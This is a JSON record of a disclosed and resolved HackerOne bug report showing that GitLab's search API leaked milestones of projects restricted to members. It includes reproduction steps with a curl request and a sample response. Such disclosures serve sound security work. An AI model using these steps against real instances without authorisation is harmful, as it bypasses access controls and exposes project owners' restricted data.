{
  "id": 460815,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80NjA4MTU=",
  "url": "https://hackerone.com/reports/460815",
  "title": "Milestones leaked via search API",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2018-12-11T20:40:56.144Z",
  "submitted_at": "2018-12-11T20:40:56.144Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "xanbanx",
    "url": "/xanbanx",
    "profile_picture_urls": {
      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 264,
    "url": "https://hackerone.com/gitlab",
    "handle": "gitlab",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/f0hovtq73f9ap815a0r1w42bocp4/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "GitLab",
      "twitter_handle": "gitlab",
      "website": "https://about.gitlab.com",
      "about": "A single application for the entire software development lifecycle."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2019-07-19T09:51:32.461Z",
  "bug_reporter_agreed_on_going_public_at": "2019-07-19T09:51:32.313Z",
  "team_member_agreed_on_going_public_at": "2019-07-18T16:00:18.103Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "GitLab allows to restrict the project features for public projects. When disabling all features of a public project for non-project members under `https://gitlab.com/xanbanx/test-search/edit`, full access to milestones is still possible via the search API.\n\n## Steps To Reproduce:\n\nReproduced on GitLab 11.6.0-rc4-ee\n\n  1. Create a public project, disable all features for non-project members by setting all features under `https://gitlab.com/xanbanx/test-search/edit` to `Only Project Members`\n  2. Create a new milestone, e.g., named `milestone`\n  3. As a non-project member perform the following API request (substitute the project id)\n\n```bash\ncurl --request GET --header \"PRIVATE-TOKEN: <YOUR-TOKEN>\" https://gitlab.example.com/api/v4/projects/<project-id>/search?search=milestone&scope=milestones\n```\n\nAlthough the user does not have access to the project and is no project member, the API returns:\n```json\n[\n    {\n        \"id\": 123,\n        \"iid\": 1,\n        \"project_id\": 12,\n        \"title\": \"milestone\",\n        \"description\": \"milestone\",\n        \"state\": \"active\",\n        \"created_at\": \"2018-12-11T20:03:25.381Z\",\n        \"updated_at\": \"2018-12-11T20:03:25.381Z\",\n        \"due_date\": null,\n        \"start_date\": null,\n        \"web_url\": \"https://gitlab.example.com/namespace/project/milestones/1\"\n    }\n]\n```\n\n## Impact\n\nBy using the search API any user with limited access can enumerate all milestones via the search API. Milestones can include critical information, e.g., related to upcoming security milestones, etc..",
  "weakness": {
    "id": 26,
    "name": "Improper Access Control - Generic"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": null,
  "vote_count": 42,
  "voters": [
    "ali",
    "ras-it",
    "sameerphad72",
    "bl4de",
    "dhakal_ananda",
    "mik317",
    "mohaned0101",
    "tulswani",
    "0nlymohammed",
    "43e1da",
    "and 32 more..."
  ],
  "severity": {
    "rating": "low",
    "author_type": "Team"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
